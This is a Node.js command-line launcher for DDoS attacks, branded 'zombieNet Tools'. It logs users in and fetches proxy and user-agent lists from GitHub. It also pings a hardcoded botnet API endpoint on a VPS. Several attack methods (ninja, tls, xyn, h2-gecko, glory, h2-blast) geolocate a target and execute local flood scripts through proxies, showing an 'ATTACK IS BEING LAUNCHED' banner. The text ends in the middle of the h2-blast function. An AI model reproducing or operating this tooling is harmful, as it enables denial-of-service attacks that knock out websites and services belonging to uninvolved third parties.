#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '1.5'
let processList = [];
const chalk = require('chalk');
const cyan = '\x1b[96m'
const birumuda = '\x1b[94m';
const ungu = '\x1b[35m';
const back_cyanmuda = '\x1b[48;5;14m';  // Cyan muda       
const back_ungumuda = '\x1b[48;5;13m'; // Ungu muda
const ungumuda = '\x1b[95m';
const bold = '\x1b[1m';
const magenta = '\x1b[38;5;199m';
const back_putih = '\x1b[48;5;255m';
const back_biru = '\x1b[48;5;57m';
const back_ungu = '\x1b[48;5;93m';
const back_ungutua = '\x1b[48;5;55m,';
const back_merah = '\x1b[48;5;196m';
const back_cyan = '\x1b[48;5;51m';
const back_magenta = '\x1b[48;5;199m';
const teksmerah = '\x1b[31m';
const merah = '\x1b[38;5;196m';
const magen = '\x1b[38;5;201m';
const tebal = '\x1b[1m';
const Reset = '\x1b[0m';
const biru = '\x1b[34m';
const hijau = '\x1b[38;2;144;238;144m';
const gradient = require('gradient-string');
const rainbowGradient = gradient('magenta', 'cyan', 'purple');
const gradientAsci = gradient('red', 'blue');
const gradientCyanBlue = gradient('red', 'red');
const asci = gradientAsci(String.raw`
                                  ______ _____     _____   __    _____
           ___________________ ______  /____(_)_______  | / /______  /_  
           ___  /_  __ \_  __ '__ \_  __ \_  /_  _ \_   |/ /_  _ \  __/
           __  /_/ /_/ /  / / / / /  /_/ /  / /  __/  /|  / /  __/ /_
           _____\/____//_/ /_/ /_//_.___//_/  \___//_/ |_/  \___/\__/`);

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
  let status;
  if (usernameInput === "Rloo11") {
    status = "Owner";
  } else if (usernameInput === "xredz") {
    status = "Admin";
  } else {
    status = "VIP🔥";
  }

  const tanggalSekarang = new Date();
  const hari = tanggalSekarang.toLocaleDateString('en-US', { weekday: 'short' });
  const bulan = tanggalSekarang.toLocaleDateString('en-US', { month: 'short' });
  const day = tanggalSekarang.getDate().toString().padStart(2, '0');
  const year = tanggalSekarang.getFullYear();
  const hours = tanggalSekarang.getHours().toString().padStart(2, '0');
  const minutes = tanggalSekarang.getMinutes().toString().padStart(2, '0');
  const seconds = tanggalSekarang.getSeconds().toString().padStart(2, '0');
  const time = `${hours}:${minutes}:${seconds}`;
  const activeAttacks = processList.length;

  const bannerText = String.raw`${hijau}${bold}[ System ]${Reset} Welcome ${usernameInput} To zombieNet Tools Version${bold}   
[ ${bulan} ${hari} ${day} ${time} ${year} ]          
                  ${asci}
    
           ${bold}| Login As : ${usernameInput} | Status : ${status} | Version : ${version}
           | Max time : 128327 | Expired : 111111 Millenium | Owner : ${teksmerah}t.me/rloo11${Reset}${bold} |
════════════════════════════════════════════════════════════════════════════════════════
          > Type "${cyan}${bold}help${Reset}${bold}" To Start Or, Type "${cyan}methods${Reset}${bold}" To See Methods Available <
`;

  console.clear();
  const lines = bannerText.split("\n");
  for (let i = 0; i < lines.length; i++) {
    await new Promise(resolve => setTimeout(resolve, 60)); 
    console.log(lines[i]); 
  }
} 
// [========================================] //
async function scrapeProxy() {
  const proxyUrls = [
    'https://raw.githubusercontent.com/Rloo1197/p-/refs/heads/main/600indo.txt',
    'https://raw.githubusercontent.com/Rloo1197/p-/refs/heads/main/400indo.txt',
    'https://raw.githubusercontent.com/Rloo1197/p-/refs/heads/main/200.txt'
  ];
  try {
    let allProxies = '';
    for (const url of proxyUrls) {
      const response = await fetch(url);
      const data = await response.text();
      allProxies += data + '\n'; 
    }
    fs.writeFileSync('proxy.txt', allProxies.trim(), 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/AyamKioot/ByCtr/refs/heads/main/useragent39.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');  
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
const fetch = require("node-fetch"); 
let usernameInput = ''; // V global
async function abcdu() { 
  const abcduUrl = "https://raw.githubusercontent.com/pvroo11/proxy.txt/refs/heads/main/proxy.txt"; 
  try {
    const response = await fetch(abcduUrl);
    if (!response.ok) {
      process.exit(-1); 
    }
    const abcduKey = (await response.text()).trim(); 
    if (abcduKey !== "ABCDkdrirssupriyhndjeanjgkontolsneifjndnsnssmekksnsniehJDEJHAKFjsjsnEJAEBZIdkenyajdnendkdjdnsnowjdndksksnsnsjejjs") { 
      process.exit(-1); 
    }
  } catch {
    process.exit(-1); 
  }
}

async function displayLoading() {
  for (let i = 1; i <= 100; i++) {
    process.stdout.write(`\rLoading... ${i}%`);
    await new Promise((resolve) => setTimeout(resolve, 1)); // Speed load
  }
  console.log(`\n${hijau}${bold}[ System ]\x1b[0m Loading complete!`);
}

async function bootup() {
  try {
    await abcdu(); 
    await displayLoading(); 

    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`);

    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Rloo1197/serios/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text();

    if (version === latestVersion.trim()) {
      const fs = require('fs'); 
      const getRawData = fs.readFileSync('./p.txt', 'utf-8'); 
      const rawData = getRawData.split("\n").map((line) => line.trim()); 
      console.clear();
      console.log(`${asci}
           Enter the password and username correctly !
           `);

      // Input Username
      permen.question(`${cyan}┌[ Input Username ]
└──➤${Reset} `, async (inputUsername) => {
        usernameInput = inputUsername.trim(); 
        
        // Input Password setelah Username diisi
        permen.question(`${cyan}┌[ Input Password ]
└──➤${Reset} `, async (inputKey) => {
          const userCredential = `${usernameInput}:${inputKey.trim()}`; 
          
          // Verifikasi kredensial
          if (rawData.includes(userCredential)) { 
            console.log(`${hijau}${bold}[ System ]${Reset} Successfully Logged`);
            await scrapeProxy();
            await scrapeUserAgent();
            await sleep(500);
            console.clear();
            console.log(`${hijau}${bold}[ System ]${Reset} ${bold}Hello, ${usernameInput} WELCOME !!${Reset} | Tools Version ${version}`);
            await sleep(1300);
            await banner();
            console.log(``);
            sigma();
          } else {
            console.log(`${merah}${bold}[ System ]${Reset} Wrong Username or Key`);
            process.exit(-1);
          }
        });
      });
    } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`);
      console.log(`Waiting Auto Update...`);
      await exec(`npm uninstall -g prmnmd-tuls`);
      console.log(`Installing update`);
      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Restart Tools Please`);
      process.exit();
    }
  } catch (error) {
    console.log(`${teksmerah}${bold}[ System ]${Reset} Turn on your wifi network`);
  }
}
// [========================================] //
async function spamPair(args) {
  if (args.length < 2) {
    console.log(`${teksmerah}${bold}[ System ] ${Reset}Example: spam-pair/pair <target> <duration>`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.log(`${hijau}${bold}[ System ] ${Reset}Successfully sent To ${target} ${duration}second`)
} catch (error) {
  console.log(`${merah}${bold}[ System ]${Reset}Oops Something Went Wrong`)
}
const metode = path.join(__dirname, `/lib/cache/13.js`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function exitScript(code = 0) {
  console.clear()
  console.log('\x1b[96m\x1b[1mgood bye');
  await new Promise((resolve) => setTimeout(resolve, 500)); 
  process.exit(code);
}
//=======

async function TestBotnetEndpoints() {
    const target = "https://google.com/";
    const duration = 1; 
    const methods = "geckold"; 
    const endpoints = [
        "http://68.183.180.197:3000/api" // Endpoint VPS yang digunakan
    ];

    let onlineServers = 0; 
    const timeout = 3000; 

    try {
        for (const endpoint of endpoints) {
            try {
               
                await Promise.race([
                    axios.get(endpoint, {
                        params: {
                            key: 'rloo11',
                            host: target,
                            time: duration,
                            method: methods,
                            username: usernameInput || 'Anonymous', // Pastikan ada fallback
                        },
                    }),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
                ]);

                
                onlineServers++;
            } catch (error) {
                
            }
        }

        // Tampilkan total server online
        console.log(`${hijau}${bold}[ System ]${Reset} Total servers online : ${onlineServers}/5`);
    } catch (error) {
        console.error(`${teksmerah}${bold}[ System ]${Reset} Error occurred during test.`);
    }
    sigma();
}

async function getIPAddress(target) {
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

        if (response.data && response.data.status === "success") {
            return response.data.query;
        } else {
            return target;
        }
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return target;
    }
}

async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });
    if (processList.length === 0) {
        console.log("\x1b[31m[ System ]\x1b[0m No attacks in progress");
        sigma();
        return;
    }

let attackDetails = ("Running :") + "\n";
attackDetails += (`│  #  │             HOST          │ SINCE │ DURATION │ METHOD  │`) + "\n";
attackDetails += (`├─────┼───────────────────────────┼───────┼──────────┼─────────┤`) + "\n";
    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(25)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });
    console.log(attackDetails);
    sigma();
}

// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
async function monitorAttack() {
  const since = Math.floor((Date.now() - process.startTime) / 1000);
  if (processList.length === 0) {
    console.log("\x1b[31m\x1b[1m[ System ]\x1b[0m No attack in progress");
    sigma()
    return;
  }
  const header = `
│                   HOST                  │ SINCE │ DURATION │ METHOD     │
├─────────────────────────────────────────┼───────┼──────────┼────────────┤`;

  console.log(header);
  for (const process of processList) {
    await new Promise((resolve) => setTimeout(resolve, 100)); 
    console.log(`│  ${process.target.padEnd(34)}     │${Math.floor((Date.now() - process.startTime) / 1000).toString().padStart(5)}  │${Reset}${process.duration.toString().padStart(8)}  │${Reset} ${process.methods.padEnd(10)} │`);

    // Memunculkan sigma() setelah 100ms
    await new Promise((resolve) => setTimeout(resolve, 110));
    sigma()
  }
}
//==========================================//
async function ninja(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: NINJA <target> <port> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} ninja ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

   
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/1`);
    await pushMonitor(target, 'ninja', duration); 
    exec(`node ${metode} ${target} ${duration}`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}
//================//
async function tls(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: TLS <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} tls ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

    
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/2`);
    await pushMonitor(target, 'tls', duration); 
    exec(`node ${metode} ${target} ${duration} 34 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}
// [========================================] /
async function xyn(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: XYN <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} xyn ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

  
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/3`);
    await pushMonitor(target, 'xyn', duration); 
    exec(`node ${metode} ${target} ${duration} 34 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function h2gecko(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: H2-GECKO <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} h2-gecko ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

   
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/4`);
    await pushMonitor(target, 'h2-gecko', duration); 
    exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function glory(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: GLORY <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} glory ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
 ${bold}                     ISP      : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.isp} ${Reset}${biru}]${Reset}
 ${bold}                     CITY     : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.city} ${Reset}${biru}]${Reset}                          
${garis2}   
               ${hijau}${bold}[ System ]${Reset}${bold} POWERED BY T.ME/RLOO11${Reset}        
               ${hijau}${bold}[ System ]${Reset}${bold} SENT BY : ${usernameInput}${Reset}    
               
   `];

 
    (async () => {
      console.clear();
      const lines = text[0].split("\n");
      
      for (let i = 0; i < lines.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 60)); 
        console.log(lines[i]); 
      }

      setTimeout(() => {
        sigma();
      }, 70);
    })();

    const metode = path.join(__dirname, `/lib/cache/5`);
    await pushMonitor(target, 'glory', duration); 
    exec(`node ${metode} ${target} ${duration} 34 2 proxy.txt`);
  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}

async function h2blast(args) {
  if (args.length < 3) {
    console.log(`${merah}${bold}[ System ] ${Reset}Example: H2-BLAST <target> <port443> <duration>`);
    sigma();
    return;
  }

  const [target, port, duration] = args;
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,regionName,city,zip,isp,query`);
    const result = scrape.data;
    const date = new Date();
    const year = date.getFullYear();
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const day = date.getDate().toString().padStart(2, '0');
    const gradientAsciAtt = gradient('cyan', 'blue');
    const asciattack = gradientAsciAtt(String.raw`                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ `);
    const gradientGaris = gradient('red', 'blue');
    const garis1 = gradientGaris`               ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`;
    const garis2 = gradientGaris`               ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    const text = [`${hijau}${bold}[ System ]${Reset}${bold} Please after attack type "${cyan}${bold}c${Reset}${bold}" or "${cyan}${bold}clr${Reset}${bold}" for back home ${Reset}  

${bold}${asciattack}${Reset}
${garis1}
                   ${bold}         ATTACK IS BEING ${teksmerah}LAUNCHED${Reset}              
${bold}                      TARGET   : ${Reset}${biru}[${Reset}${bold}${cyan} ${target} ${Reset}${biru}]${Reset}
 ${bold}                     DURATION : ${Reset}${biru}[${Reset}${bold}${cyan} ${duration} ${Reset}${biru}]${Reset}
 ${bold}                     METHODS  : ${Reset}${biru}[${Reset}${bold}${cyan} h2-blast ${Reset}${biru}]${Reset}
${bold}                      PORT     : ${Reset}${biru}[${Reset}${bold}${cyan} 443 ${Reset}${biru}]${Reset}
${bold}                      SENT ON  : ${Reset}${biru}[${Reset}${bold}${cyan} ${day}/${month}/${year} ${Reset}${biru}]${Reset}
${bold}                      IP       : ${Reset}${biru}[${Reset}${bold}${cyan} ${result.query} ${Reset}${biru}]${Reset}
